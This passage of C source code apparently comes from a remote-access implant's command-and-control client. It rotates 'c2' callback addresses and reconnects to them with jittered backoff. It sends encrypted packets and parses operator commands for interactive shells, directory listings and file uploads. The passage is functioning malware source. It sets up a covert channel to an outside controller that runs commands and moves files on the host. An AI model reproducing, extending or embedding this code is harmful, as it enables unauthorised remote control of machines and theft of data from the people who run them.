    pthread_mutex_lock(&g_runtime_c2_mutex);
    for (int i = 0; i < g_addr_count; i++) {

        if (g_client_addrs[i] != NULL && g_client_addrs[i][0] != '\0') {
            safe_strncpy(old_log[i], g_client_addrs[i], sizeof(old_log[i]));
        } else {
            old_log[i][0] = '\0';
        }

    }

    if (apply_runtime_c2_addresses_locked(normalized_ptrs, count) != 0) {

        pthread_mutex_unlock(&g_runtime_c2_mutex);
        return -1;

    }
    pthread_mutex_unlock(&g_runtime_c2_mutex);

    for (int i = 0; i < g_addr_count; i++) {

        if (i < count) {
            safe_strncpy(new_log[i], normalized[i], sizeof(new_log[i]));
        } else {
            new_log[i][0] = '\0';
        }

    }

    pthread_mutex_lock(&g_config.mutex);
    {

        char host[256];
        int port = 0;
        if (parse_address_host_port(normalized[0], host, sizeof(host), &port) == 0) {
            safe_strncpy(g_config.c2_host, host, sizeof(g_config.c2_host));
            g_config.c2_port = port;
            g_config.updated_at = time(NULL);
        }

    }
    pthread_mutex_unlock(&g_config.mutex);

    pthread_mutex_lock(&g_active_c2.mutex);
    memset(g_active_c2.host, 0, sizeof(g_active_c2.host));
    g_active_c2.port = 0;
    g_active_c2.valid = 0;
    pthread_mutex_unlock(&g_active_c2.mutex);

    LOG_INFO("========================================");
    LOG_INFO("Callback addresses updated");
    LOG_INFO("========================================");
    for (int i = 0; i < g_addr_count; i++) {
        if (old_log[i][0] != '\0') LOG_INFO("Old[%d]: %s", i + 1, old_log[i]);
    }
    for (int i = 0; i < count; i++) {
        LOG_INFO("New[%d]: %s", i + 1, new_log[i]);
    }
    LOG_INFO("========================================");

    atomic_store_compat(&g_state.connected, 0);
    return 0;

}









static MAYBE_UNUSED int resolve_hostname(const char* hostname, int port, char* ip_out,

    int ip_out_len, int* family_out) {

    struct addrinfo hints, * res, * rp;

    char port_str[16];

    int found = 0;

    time_t now;



    if (!hostname || !ip_out || !family_out) return -1;



    pthread_mutex_lock(&g_dns_cache.mutex);



    time(&now);

    if (strlen(g_dns_cache.hostname) > 0 &&

        strcmp(g_dns_cache.hostname, hostname) == 0 &&

        (now - g_dns_cache.last_resolve_time) < DNS_RESOLVE_INTERVAL) {



        safe_strncpy(ip_out, g_dns_cache.resolved_ip, ip_out_len);

        *family_out = g_dns_cache.ai_family;



        pthread_mutex_unlock(&g_dns_cache.mutex);

        return 0;

    }



    pthread_mutex_unlock(&g_dns_cache.mutex);



    snprintf(port_str, sizeof(port_str), "%d", port);



    memset(&hints, 0, sizeof(hints));

    hints.ai_family = AF_UNSPEC;

    hints.ai_socktype = SOCK_STREAM;



    if (getaddrinfo(hostname, port_str, &hints, &res) != 0) {

        return -1;

    }



    for (rp = res; rp != NULL; rp = rp->ai_next) {

        if (rp->ai_family == AF_INET) {

            struct sockaddr_in* ipv4 = (struct sockaddr_in*)rp->ai_addr;

            inet_ntop(AF_INET, &ipv4->sin_addr, ip_out, ip_out_len);

            *family_out = AF_INET;

            found = 1;

            break;

        }

    }



    if (!found) {

        for (rp = res; rp != NULL; rp = rp->ai_next) {

            if (rp->ai_family == AF_INET6) {

                struct sockaddr_in6* ipv6 = (struct sockaddr_in6*)rp->ai_addr;

                inet_ntop(AF_INET6, &ipv6->sin6_addr, ip_out, ip_out_len);

                *family_out = AF_INET6;

                found = 1;

                break;

            }

        }

    }



    freeaddrinfo(res);



    if (!found) return -1;



    pthread_mutex_lock(&g_dns_cache.mutex);

    safe_strncpy(g_dns_cache.hostname, hostname, sizeof(g_dns_cache.hostname));

    safe_strncpy(g_dns_cache.resolved_ip, ip_out, sizeof(g_dns_cache.resolved_ip));

    g_dns_cache.port = port;

    g_dns_cache.ai_family = *family_out;

    time(&g_dns_cache.last_resolve_time);

    pthread_mutex_unlock(&g_dns_cache.mutex);



    return 0;

}



static int prepare_connect_target(const char* host, int port,

    char* resolved_host, size_t resolved_host_size,

    char* connect_url, size_t connect_url_size, int* family_out) {

    int resolved_family = AF_UNSPEC;

    int host_is_ip = 0;



    if (host == NULL || host[0] == '\0' || port < 1 || port > 65535 ||

        resolved_host == NULL || resolved_host_size == 0 ||

        connect_url == NULL || connect_url_size == 0) {

        return -1;

    }



    host_is_ip = is_ip_literal(host);

    if (host_is_ip) {

        int written = snprintf(resolved_host, resolved_host_size, "%s", host);

        if (written <= 0 || (size_t)written >= resolved_host_size) {

            return -1;

        }

    } else {

        if (resolve_hostname(host, port, resolved_host, (int)resolved_host_size, &resolved_family) != 0) {

            return -1;

        }

    }



    if (build_connect_url(resolved_host, port, connect_url, connect_url_size) != 0) {

        return -1;

    }



    if (family_out != NULL) {

        *family_out = resolved_family;

    }



    return 0;

}







// ========================================



// ========================================





static void write_packet_length(unsigned char *buf, uint32_t len);

static uint32_t read_packet_length(const unsigned char *buf);

static int send_packet(struct mg_connection *c, const void *data, size_t len, const uint8_t* session_key);



// ========================================



// ========================================





// Current tunnel transport uses tunnel_session_t only.





// ========================================



// ========================================



static void debug_hex_dump(const char* label, const unsigned char* buf, size_t len) {

    printf("[%s] len=%zu, data=", label, len);

    for (size_t i = 0; i < len ; i++) {

        printf("%02X ", buf[i]);

    }

    printf(" | ascii=");

    for (size_t i = 0; i < len ; i++) {

        printf("%c", isprint(buf[i]) ? buf[i] : '.');

    }

    printf("\n");

}



void generate_random_bytes(uint8_t* buf, size_t len) {

    size_t i = 0;

    int success = 0;



#ifdef __linux__



    if (getrandom(buf, len, 0) == (ssize_t)len) {

        success = 1;

    }

#endif









    if (!success) {



        srand((unsigned int)(time(NULL) + (uintptr_t)buf));

        for (i = 0; i < len; i++) {

            buf[i] = (uint8_t)(rand() % 256);

        }

    }

}



void print_session_key(const char* label, const unsigned char* key, size_t key_len) {

    printf("%s: ", label);

    for (size_t i = 0; i < key_len; i++) {

        printf("%02x", key[i]);

    }

    printf(" (length: %d bytes, %d hex chars)\n", 16, 32);

}



// ========================================



// ========================================





static MAYBE_UNUSED void write_packet_length(unsigned char *buf, uint32_t len) {

    buf[0] = (len >> 24) & 0xFF;

    buf[1] = (len >> 16) & 0xFF;

    buf[2] = (len >> 8) & 0xFF;

    buf[3] = len & 0xFF;

}





static uint32_t read_packet_length(const unsigned char *buf) {

    uint32_t network_len;

    memcpy(&network_len, buf, sizeof(uint32_t));

    uint32_t host_len = ntohl(network_len);





    printf("[debug] Raw header bytes: %02X %02X %02X %02X -> host length %u\n",

        buf[0], buf[1], buf[2], buf[3], host_len);



    return host_len;

}

static size_t payload_nonce_size(void) {
#if PAYLOAD_CIPHER_MODE == PAYLOAD_CIPHER_RC5
    return RC5_PAYLOAD_IV_SIZE;
#else
    return 12;
#endif
}

static void configure_job_control_signals(void) {
#ifndef _WIN32
    (void) signal(SIGPIPE, SIG_IGN);
#ifdef SIGTSTP
    (void) signal(SIGTSTP, SIG_IGN);
#endif
#ifdef SIGTTIN
    (void) signal(SIGTTIN, SIG_IGN);
#endif
#ifdef SIGTTOU
    (void) signal(SIGTTOU, SIG_IGN);
#endif
#endif
}

static size_t payload_tag_size(void) {
#if PAYLOAD_CIPHER_MODE == PAYLOAD_CIPHER_RC5
    return 0;
#else
    return 16;
#endif
}

static int payload_encrypt_bytes(const uint8_t* session_key,
                                 const uint8_t* nonce,
                                 const uint8_t* plain,
                                 uint32_t plain_len,
                                 uint8_t* cipher,
                                 uint8_t* tag) {
#if PAYLOAD_CIPHER_MODE == PAYLOAD_CIPHER_RC5
    (void)tag;
    return rc5_payload_encrypt(session_key, nonce, plain, plain_len, cipher);
#else
    return aes_gcm_encrypt(session_key, nonce, plain, plain_len, cipher, tag);
#endif
}

static int payload_decrypt_bytes(const uint8_t* session_key,
                                 const uint8_t* nonce,
                                 const uint8_t* cipher,
                                 uint32_t cipher_len,
                                 const uint8_t* tag,
                                 uint8_t* plain) {
#if PAYLOAD_CIPHER_MODE == PAYLOAD_CIPHER_RC5
    (void)tag;
    return rc5_payload_decrypt(session_key, nonce, cipher, cipher_len, plain);
#else
    return aes_gcm_decrypt(session_key, nonce, cipher, cipher_len, tag, plain);
#endif
}





static int send_packet(struct mg_connection *c, const void *data, size_t data_len, const uint8_t* session_key) {

#if PAYLOAD_ENCRYPTION == 1



    print_session_key("AES payload mode, send_packet SessionKey", session_key, 16);



    uint8_t nonce[16] = {0};

    uint8_t tag[16] = {0};

    uint8_t* cipher = NULL;

    int ret = -1;





    cipher = malloc(data_len);

    if (!cipher) {

        LOG_ERROR("Failed to allocate memory for cipher");

        return -1;

    }





    generate_random_bytes(nonce, payload_nonce_size());





    uint32_t total_len = (uint32_t)(payload_nonce_size() + data_len + payload_tag_size());





    uint32_t net_len = htonl(total_len);







    if (payload_encrypt_bytes(session_key, nonce, data, (uint32_t)data_len, cipher, tag) != 0) {
        LOG_ERROR("Failed to encrypt packet payload");
        goto cleanup;
    }











    if (!mg_send(c, (unsigned char*)&net_len, 4)) {

        LOG_ERROR("Failed to send packet length");

        goto cleanup;

    }





    if (!mg_send(c, nonce, payload_nonce_size())) {

        LOG_ERROR("Failed to send nonce");

        goto cleanup;

}





    if (!mg_send(c, cipher, data_len)) {

        LOG_ERROR("Failed to send cipher");

        goto cleanup;

    }





    if (payload_tag_size() > 0 && !mg_send(c, tag, payload_tag_size()) ) {

        LOG_ERROR("Failed to send tag");

        goto cleanup;

    }



    LOG_DEBUG("Encrypted packet sent (plaintext: %u bytes, total: %u bytes)",

        data_len, total_len + 4);

    

    ret = 0;

cleanup:

    if (cipher) {

        free(cipher);

    }

    return ret;

#else

    printf("AES payload mode..\n");

    (void)session_key;



    unsigned char header[PACKET_HEADER_SIZE];

    write_packet_length(header, (uint32_t)data_len);

    if (!mg_send(c, header, PACKET_HEADER_SIZE)) return -1;

    if (!mg_send(c, data, data_len)) return -1;

    printf("Payload size: %zu bytes\n", data_len);

    return 0;

#endif

}



static int send_all_fd(int sock, const void *buf, size_t len) {

    const unsigned char *p = (const unsigned char *)buf;

    size_t sent = 0;

    while (sent < len) {

#ifdef MSG_NOSIGNAL
        ssize_t n = send(sock, p + sent, len - sent, MSG_NOSIGNAL);
#else
        ssize_t n = send(sock, p + sent, len - sent, 0);
#endif

        if (n < 0) {

            if (errno == EINTR) continue;

            return -1;

        }

        if (n == 0) return -1;

        sent += (size_t)n;

    }

    return 0;

}

static int write_all_fd(int fd, const void *buf, size_t len) {

    const unsigned char *p = (const unsigned char *)buf;

    size_t written = 0;

    while (written < len) {

        ssize_t n = write(fd, p + written, len - written);

        if (n < 0) {

            if (errno == EINTR) continue;

            return -1;

        }

        if (n == 0) return -1;

        written += (size_t)n;

    }

    return 0;

}

static void format_data_preview(const uint8_t* data, size_t len, char* out, size_t out_len) {

    size_t i;

    size_t pos = 0;

    size_t limit;



    if (!out || out_len == 0) {

        return;

    }

    if (!data || len == 0) {

        safe_strncpy(out, "<empty>", out_len);

        return;

    }

    limit = len < 16 ? len : 16;

    for (i = 0; i < limit && pos + 3 < out_len; ++i) {

        int written = snprintf(out + pos, out_len - pos, "%02x", data[i]);

        if (written < 0) {

            break;

        }

        pos += (size_t)written;

    }

    if (limit < len && pos + 4 < out_len) {

        safe_strncpy(out + pos, "...", out_len - pos);

    } else if (pos < out_len) {

        out[pos] = '\0';

    } else {

        out[out_len - 1] = '\0';

    }

}



static int send_packet_fd(int sock, const void *data, size_t data_len, const uint8_t* session_key) {

#if PAYLOAD_ENCRYPTION == 1

    uint8_t nonce[16] = {0};

    uint8_t tag[16] = {0};

    uint8_t *cipher = (uint8_t *)malloc(data_len);

    if (cipher == NULL) return -1;



    generate_random_bytes(nonce, payload_nonce_size());

    if (payload_encrypt_bytes(session_key, nonce, data, (uint32_t)data_len, cipher, tag) != 0) {
        free(cipher);
        return -1;
    }



    uint32_t total_len = (uint32_t)(payload_nonce_size() + data_len + payload_tag_size());

    uint32_t net_len = htonl(total_len);



    if (send_all_fd(sock, &net_len, sizeof(net_len)) < 0 ||

        send_all_fd(sock, nonce, payload_nonce_size()) < 0 ||

        send_all_fd(sock, cipher, data_len) < 0 ||

        (payload_tag_size() > 0 && send_all_fd(sock, tag, payload_tag_size()) < 0)) {

        free(cipher);

        return -1;

    }



    free(cipher);

    return 0;

#else

    (void)session_key;

    unsigned char header[PACKET_HEADER_SIZE];

    write_packet_length(header, (uint32_t)data_len);

    if (send_all_fd(sock, header, PACKET_HEADER_SIZE) < 0) return -1;

    if (send_all_fd(sock, data, data_len) < 0) return -1;

    return 0;

#endif

}



// ========================================



// ========================================





static MAYBE_UNUSED void handle_cmd_echo(struct mg_connection *c, const unsigned char *data, uint32_t len) {

    printf("Received echo command: %.*s\n", (int)len, data);



    send_packet(c, data, len, GLOBAL_KEY);

}





static void thread_network_handler(struct mg_connection *c, int ev, void *ev_data) {

    thread_context_t *ctx = (thread_context_t*)c->fn_data;



    switch (ev) {

        case MG_EV_OPEN:

            printf("[thread %d] Connection opened\n", ctx->thread_id);

            break;



        case MG_EV_CONNECT: {

            int status = *(int*)ev_data;

            if (status == 0) {

                printf("[thread %d] Connection established: %s\n", ctx->thread_id, ctx->server_addr);

            } else {

                printf("[thread %d] Connection failed: %s\n", ctx->thread_id, ctx->server_addr);

                ctx->running = 0;

            }

            break;

        }



        case MG_EV_READ: {



            struct mg_iobuf *io = &c->recv;



            while (io->len >= PACKET_HEADER_SIZE) {

                uint32_t packet_len = read_packet_length(io->buf);



                if (packet_len > MAX_PACKET_SIZE) {

                    printf("[thread %d] Invalid packet length: %u\n", ctx->thread_id, packet_len);

                    c->is_closing = 1;

                    return;

                }



                if (io->len < PACKET_HEADER_SIZE + packet_len) {

                    break;

                }



                unsigned char *packet_data = io->buf + PACKET_HEADER_SIZE;

                printf("[thread %d] Received packet: %u bytes\n", ctx->thread_id, packet_len);







                send_packet(c, packet_data, packet_len, GLOBAL_KEY);



                mg_iobuf_del(io, 0, PACKET_HEADER_SIZE + packet_len);

            }

            break;

        }



        case MG_EV_CLOSE:

            printf("[thread %d] Connection closed\n", ctx->thread_id);



            break;



        case MG_EV_ERROR:

            printf("[thread %d] Error: %s\n", ctx->thread_id, (char*)ev_data);



            break;

    }

}





static THREAD_FUNC thread_function(void *arg) {

    thread_context_t *ctx = (thread_context_t*)arg;

    struct mg_mgr mgr;

    struct mg_connection *conn = NULL;



    printf("[thread %d] Starting, connecting to: %s\n", ctx->thread_id, ctx->server_addr);



    mg_mgr_init(&mgr);





    while (ctx->running && !g_shutdown) {



        conn = mg_connect(&mgr, ctx->server_addr, thread_network_handler, ctx);

        if (conn == NULL) {

            printf("[thread %d] Failed to create connection\n", ctx->thread_id);



#if ENABLE_RECONNECT

            if (MAX_RECONNECT_ATTEMPTS > 0 && ctx->reconnect_attempts >= MAX_RECONNECT_ATTEMPTS) {

                printf("[thread %d] Max reconnect attempts reached, exiting\n", ctx->thread_id);

                break;

            }



            ctx->reconnect_attempts++;

            if (ctx->reconnect_attempts <= 1) {

                ctx->reconnect_delay = g_reconnect_base_delay;

            }

            int delay = ctx->reconnect_delay + get_jitter_with_base(ctx->reconnect_delay);

            if (delay < 0) delay = 0;



            printf("[thread %d] Reconnect after %d ms (attempt %d/%d)\n",

                   ctx->thread_id, delay, ctx->reconnect_attempts,

                   MAX_RECONNECT_ATTEMPTS > 0 ? MAX_RECONNECT_ATTEMPTS : -1);



            sleep_ms(delay);





            ctx->reconnect_delay = ctx->reconnect_delay * 2;

            if (ctx->reconnect_delay > RECONNECT_MAX_DELAY) {

                ctx->reconnect_delay = RECONNECT_MAX_DELAY;

            }

            continue;

#else

            break;

#endif

        }





        ctx->reconnect_attempts = 0;

        ctx->reconnect_delay = g_reconnect_base_delay;

        printf("[thread %d] Connection established\n", ctx->thread_id);





        int connection_alive = 1;

        while (ctx->running && !g_shutdown && connection_alive) {

            mg_mgr_poll(&mgr, 1000);





            connection_alive = 0;

            for (struct mg_connection *c = mgr.conns; c != NULL; c = c->next) {

                if (c == conn && !c->is_closing) {

                    connection_alive = 1;

                    break;

                }

            }

        }



        printf("[thread %d] Disconnected\n", ctx->thread_id);



#if ENABLE_RECONNECT

        if (ctx->running && !g_shutdown) {

            ctx->reconnect_attempts++;

            if (ctx->reconnect_attempts <= 1) {

                ctx->reconnect_delay = g_reconnect_base_delay;

            }

            if (MAX_RECONNECT_ATTEMPTS > 0 && ctx->reconnect_attempts >= MAX_RECONNECT_ATTEMPTS) {

                printf("[thread %d] Max reconnect attempts reached, exiting\n", ctx->thread_id);

                break;

            }



            int delay = ctx->reconnect_delay + get_jitter_with_base(ctx->reconnect_delay);

            if (delay < 0) delay = 0;



            printf("[thread %d] Reconnect after %d ms (attempt %d/%d)\n",

                   ctx->thread_id, delay, ctx->reconnect_attempts,

                   MAX_RECONNECT_ATTEMPTS > 0 ? MAX_RECONNECT_ATTEMPTS : -1);



            sleep_ms(delay);





            ctx->reconnect_delay = ctx->reconnect_delay * 2;

            if (ctx->reconnect_delay > RECONNECT_MAX_DELAY) {

                ctx->reconnect_delay = RECONNECT_MAX_DELAY;

            }

        } else {

            break;

        }

#else

        break;

#endif

    }





    mg_mgr_free(&mgr);

    printf("[thread %d] Exiting\n", ctx->thread_id);





    ctx->exited = 1;



#ifdef _WIN32

    return 0;

#else

    return NULL;

#endif

}





static MAYBE_UNUSED void handle_cmd_connect(struct mg_connection *c, const unsigned char *data, uint32_t len) {



    char server_addr[128] = {0};

    if (len >= sizeof(server_addr)) {

        len = sizeof(server_addr) - 1;

    }

    memcpy(server_addr, data, len);

    server_addr[len] = '\0';



    printf("Received connect command: %s (current thread count: %d)\n", server_addr, get_thread_count());





    thread_context_t *ctx = (thread_context_t*)malloc(sizeof(thread_context_t));

    if (ctx == NULL) {

        printf("Error: memory allocation failed\n");

        const char *resp = "ERROR: Memory allocation failed";

        send_packet(c, resp, strlen(resp), GLOBAL_KEY);

        return;

    }



    memset(ctx, 0, sizeof(thread_context_t));

    safe_strncpy(ctx->server_addr, server_addr, sizeof(ctx->server_addr));

    ctx->running = 1;

    ctx->thread_id = g_next_thread_id++;

    ctx->reconnect_attempts = 0;

    ctx->reconnect_delay = g_reconnect_base_delay;





    if (!CREATE_THREAD(ctx->thread, thread_function, ctx)) {

        printf("Error: failed to create thread\n");

        free(ctx);

        const char *resp = "ERROR: Thread creation failed";

        send_packet(c, resp, strlen(resp), GLOBAL_KEY);

        return;

    }





    add_thread(ctx);



    char resp[64];

    snprintf(resp, sizeof(resp), "OK: Thread %d created", ctx->thread_id);

    send_packet(c, resp, strlen(resp), GLOBAL_KEY);

}





static MAYBE_UNUSED void handle_cmd_disconnect(struct mg_connection *c, const unsigned char *data, uint32_t len) {

    if (len < 4) {

        printf("Error: disconnect command parameters are incomplete\n");

        const char *resp = "ERROR: Invalid parameters";

        send_packet(c, resp, strlen(resp), GLOBAL_KEY);

        return;

    }





    int thread_id = (int)read_packet_length(data);

    printf("Received disconnect command: thread %d\n", thread_id);



    thread_context_t *ctx = find_thread(thread_id);

    if (ctx == NULL) {

        printf("Error: thread ID %d does not exist\n", thread_id);

        const char *resp = "ERROR: Thread not found";

        send_packet(c, resp, strlen(resp), GLOBAL_KEY);

        return;

    }



    ctx->running = 0;



    char resp[64];

    snprintf(resp, sizeof(resp), "OK: Thread %d stopping", thread_id);

    send_packet(c, resp, strlen(resp), GLOBAL_KEY);

}





static MAYBE_UNUSED void handle_cmd_rsa_encrypt(struct mg_connection *c, const unsigned char *data, uint32_t len) {

    (void)data;

    (void)len;

    printf("Received RSA encrypt command: %u bytes\n", len);



    const char *resp = "RSA encryption not implemented yet";

    send_packet(c, resp, strlen(resp), GLOBAL_KEY);

}





static MAYBE_UNUSED void handle_cmd_rsa_decrypt(struct mg_connection *c, const unsigned char *data, uint32_t len) {

    (void)data;

    (void)len;

    printf("Received RSA decrypt command: %u bytes\n", len);



    const char *resp = "RSA decryption not implemented yet";

    send_packet(c, resp, strlen(resp), GLOBAL_KEY);

}




static void process_data(struct mg_connection* c, const unsigned char* buf, int len);





static int parse_shell_command(mpack_node_t data_node, shell_command_t* cmd) {

    if (mpack_node_type(data_node) != mpack_type_bin) {

        LOG_ERROR("Shell data is not binary");

        return -1;

    }



    size_t data_size = mpack_node_bin_size(data_node);

    const char* data_ptr = mpack_node_bin_data(data_node);



    LOG_DEBUG("Parsing shell command (%zu bytes)", data_size);

    debug_hex_dump("Shell data", (const uint8_t*)data_ptr,

        data_size < 128 ? data_size : 128);



    mpack_tree_t tree;

    mpack_tree_init_data(&tree, data_ptr, data_size);

    mpack_tree_parse(&tree);



    if (mpack_tree_error(&tree) != mpack_ok) {

        LOG_ERROR("Failed to parse shell data: %s",

            mpack_error_to_string(mpack_tree_error(&tree)));

        mpack_tree_destroy(&tree);

        return -1;

    }



    mpack_node_t root = mpack_tree_root(&tree);



    if (mpack_node_type(root) != mpack_type_map) {

        LOG_ERROR("Shell data root is not a map");

        mpack_tree_destroy(&tree);

        return -1;

    }



    LOG_DEBUG("Shell data is a map with %zu entries", mpack_node_map_count(root));





    mpack_node_t term_id_node = mpack_node_map_cstr_optional(root, "term_id");

    if (!mpack_node_is_missing(term_id_node)) {

        cmd->term_id = mpack_node_u32(term_id_node);

        LOG_INFO("  term_id: 0x%08x (%u)", cmd->term_id, cmd->term_id);

    }





    mpack_node_t program_node = mpack_node_map_cstr_optional(root, "program");

    if (!mpack_node_is_missing(program_node) &&

        mpack_node_type(program_node) == mpack_type_str) {



        size_t prog_len = mpack_node_strlen(program_node);

        const char* prog_str = mpack_node_str(program_node);



        if (prog_len < sizeof(cmd->program)) {

            memcpy(cmd->program, prog_str, prog_len);

            cmd->program[prog_len] = '\0';

            LOG_INFO("  program: %s", cmd->program);

        }

    }





    mpack_node_t width_node = mpack_node_map_cstr_optional(root, "width");

    if (!mpack_node_is_missing(width_node)) {



        if (mpack_node_type(width_node) == mpack_type_uint) {

            cmd->width = (uint16_t)mpack_node_u16(width_node);

            LOG_INFO("  width: %u columns", cmd->width);

        }

    }

    else {

        cmd->width = 80;

        LOG_DEBUG("  width: %u (default)", cmd->width);

    }





    mpack_node_t height_node = mpack_node_map_cstr_optional(root, "height");

    if (!mpack_node_is_missing(height_node)) {

        if (mpack_node_type(height_node) == mpack_type_uint) {

            cmd->height = (uint16_t)mpack_node_u16(height_node);

            LOG_INFO("  height: %u rows", cmd->height);

        }

    }

    else {

        cmd->height = 24;

        LOG_DEBUG("  height: %u (default)", cmd->height);

    }





    mpack_node_t args_node = mpack_node_map_cstr_optional(root, "args");

    if (!mpack_node_is_missing(args_node) &&

        mpack_node_type(args_node) == mpack_type_array) {



        size_t args_count = mpack_node_array_length(args_node);

        LOG_INFO("  args count: %zu", args_count);



        if (args_count > 0) {

            cmd->args = calloc(args_count + 1, sizeof(char*));

            cmd->args_count = args_count;



            for (size_t i = 0; i < args_count; i++) {

                mpack_node_t arg_node = mpack_node_array_at(args_node, i);



                if (mpack_node_type(arg_node) == mpack_type_str) {

                    size_t arg_len = mpack_node_strlen(arg_node);

                    const char* arg_str = mpack_node_str(arg_node);



                    cmd->args[i] = malloc(arg_len + 1);

                    memcpy(cmd->args[i], arg_str, arg_len);

                    cmd->args[i][arg_len] = '\0';



                    LOG_INFO("    args[%zu]: %s", i, cmd->args[i]);

                }

            }

            cmd->args[args_count] = NULL;

        }

    }





    mpack_node_t env_node = mpack_node_map_cstr_optional(root, "env");

    if (!mpack_node_is_missing(env_node)) {

        if (mpack_node_type(env_node) == mpack_type_array) {

            size_t env_count = mpack_node_array_length(env_node);

            LOG_INFO("  env count: %zu", env_count);



            if (env_count > 0) {

                cmd->env = calloc(env_count + 1, sizeof(char*));

                cmd->env_count = env_count;



                for (size_t i = 0; i < env_count; i++) {

                    mpack_node_t env_item = mpack_node_array_at(env_node, i);



                    if (mpack_node_type(env_item) == mpack_type_str) {

                        size_t env_len = mpack_node_strlen(env_item);

                        const char* env_str = mpack_node_str(env_item);



                        cmd->env[i] = malloc(env_len + 1);

                        memcpy(cmd->env[i], env_str, env_len);

                        cmd->env[i][env_len] = '\0';



                        LOG_INFO("    env[%zu]: %s", i, cmd->env[i]);

                    }

                }

                cmd->env[env_count] = NULL;

            }

        }

        else if (mpack_node_type(env_node) == mpack_type_map) {



            size_t env_count = mpack_node_map_count(env_node);

            LOG_INFO("  env (map) count: %zu", env_count);



            if (env_count > 0) {

                cmd->env = calloc(env_count + 1, sizeof(char*));

                cmd->env_count = env_count;





                size_t idx = 0;

                for (size_t i = 0; i < env_count; i++) {

                    mpack_node_t key = mpack_node_map_key_at(env_node, i);

                    mpack_node_t value = mpack_node_map_value_at(env_node, i);



                    if (mpack_node_type(key) == mpack_type_str &&

                        mpack_node_type(value) == mpack_type_str) {



                        size_t key_len = mpack_node_strlen(key);

                        const char* key_str = mpack_node_str(key);



                        size_t val_len = mpack_node_strlen(value);

                        const char* val_str = mpack_node_str(value);





                        size_t total_len = key_len + 1 + val_len + 1;

                        cmd->env[idx] = malloc(total_len);

                        snprintf(cmd->env[idx], total_len, "%.*s=%.*s",

                            (int)key_len, key_str, (int)val_len, val_str);



                        LOG_INFO("    env[%zu]: %s", idx, cmd->env[idx]);

                        idx++;

                    }

                }

                cmd->env[idx] = NULL;

                cmd->env_count = idx;

            }

        }

    }





    mpack_node_t cwd_node = mpack_node_map_cstr_optional(root, "cwd");

    if (!mpack_node_is_missing(cwd_node) &&

        mpack_node_type(cwd_node) == mpack_type_str) {



        size_t cwd_len = mpack_node_strlen(cwd_node);

        const char* cwd_str = mpack_node_str(cwd_node);



        if (cwd_len < sizeof(cmd->cwd)) {

            memcpy(cmd->cwd, cwd_str, cwd_len);

            cmd->cwd[cwd_len] = '\0';

            LOG_INFO("  cwd: %s", cmd->cwd);

        }

    }



    mpack_tree_destroy(&tree);

    return 0;

}

static int parse_file_listdir_command(mpack_node_t data_node, file_listdir_command_t* cmd) {

    if (mpack_node_is_missing(data_node)) {

        LOG_ERROR("Listdir data node is missing");

        return -1;

    }





    if (mpack_node_type(data_node) == mpack_type_bin) {

        LOG_DEBUG("data_node is binary, unpacking...");



        size_t bin_size = mpack_node_bin_size(data_node);

        const char* bin_data = mpack_node_bin_data(data_node);



        LOG_DEBUG("Binary data size: %zu bytes", bin_size);





        mpack_tree_t inner_tree;

        mpack_tree_init_data(&inner_tree, bin_data, bin_size);

        mpack_tree_parse(&inner_tree);



        if (mpack_tree_error(&inner_tree) != mpack_ok) {

            LOG_ERROR("Failed to parse data binary: %s",

                mpack_error_to_string(mpack_tree_error(&inner_tree)));

            mpack_tree_destroy(&inner_tree);

            return -1;

        }



        mpack_node_t inner_root = mpack_tree_root(&inner_tree);





        mpack_node_t path_node = mpack_node_map_cstr_optional(inner_root, "path");

        if (mpack_node_is_missing(path_node)) {

            LOG_ERROR("Listdir path is missing");

            mpack_tree_destroy(&inner_tree);

            return -1;

        }



        size_t path_len = mpack_node_strlen(path_node);

        if (path_len >= sizeof(cmd->path)) {

            LOG_ERROR("Path too long: %zu", path_len);

            mpack_tree_destroy(&inner_tree);

            return -1;

        }



        const char* path_str = mpack_node_str(path_node);

        memcpy(cmd->path, path_str, path_len);

        cmd->path[path_len] = '\0';



        LOG_INFO("Parsed listdir path: [%s]", cmd->path);



        mpack_tree_destroy(&inner_tree);



    }

    else if (mpack_node_type(data_node) == mpack_type_map) {



        LOG_DEBUG("data_node is map, parsing directly...");



        mpack_node_t path_node = mpack_node_map_cstr_optional(data_node, "path");

        if (mpack_node_is_missing(path_node)) {

            LOG_ERROR("Listdir path is missing");

            return -1;

        }



        size_t path_len = mpack_node_strlen(path_node);

        if (path_len >= sizeof(cmd->path)) {

            LOG_ERROR("Path too long: %zu", path_len);

            return -1;

        }



        const char* path_str = mpack_node_str(path_node);

        memcpy(cmd->path, path_str, path_len);

        cmd->path[path_len] = '\0';



        LOG_INFO("Parsed listdir path: [%s]", cmd->path);



    }

    else {

        LOG_ERROR("Unexpected data node type: %d", mpack_node_type(data_node));

        return -1;

    }



    return 0;

}



static int parse_file_upload_command(mpack_node_t data_node, file_upload_command_t* cmd) {

    if (mpack_node_is_missing(data_node)) {

        LOG_ERROR("File upload data node is missing");

        return -1;

    }

    cmd->content = NULL;

    cmd->content_len = 0;

    cmd->offset = 0;

    cmd->finish = 0;





    if (mpack_node_type(data_node) == mpack_type_bin) {

        LOG_DEBUG("data_node is binary, unpacking...");



        size_t bin_size = mpack_node_bin_size(data_node);

        const char* bin_data = mpack_node_bin_data(data_node);



        LOG_DEBUG("Binary data size: %zu bytes", bin_size);





        mpack_tree_t inner_tree;

        mpack_tree_init_data(&inner_tree, bin_data, bin_size);

        mpack_tree_parse(&inner_tree);



        if (mpack_tree_error(&inner_tree) != mpack_ok) {

            LOG_ERROR("Failed to parse data binary: %s",

                mpack_error_to_string(mpack_tree_error(&inner_tree)));

            mpack_tree_destroy(&inner_tree);

            return -1;

        }



        mpack_node_t inner_root = mpack_tree_root(&inner_tree);





        mpack_node_t path_node = mpack_node_map_cstr_optional(inner_root, "path");

        if (!mpack_node_is_missing(path_node) &&

            mpack_node_type(path_node) == mpack_type_str) {



            size_t path_len = mpack_node_strlen(path_node);

            if (path_len >= sizeof(cmd->path)) {

                LOG_ERROR("Path too long: %zu", path_len);

                mpack_tree_destroy(&inner_tree);

                return -1;

            }



            const char* path_str = mpack_node_str(path_node);

            memcpy(cmd->path, path_str, path_len);

            cmd->path[path_len] = '\0';

            LOG_INFO("  path: %s", cmd->path);

        }





        mpack_node_t content_node = mpack_node_map_cstr_optional(inner_root, "content");

        if (!mpack_node_is_missing(content_node) &&

            mpack_node_type(content_node) == mpack_type_bin) {

            cmd->content_len = mpack_node_bin_size(content_node);

            cmd->content = malloc(cmd->content_len);

            memcpy(cmd->content, mpack_node_bin_data(content_node), cmd->content_len);

            LOG_INFO("  content_len: %zu", cmd->content_len);

        }





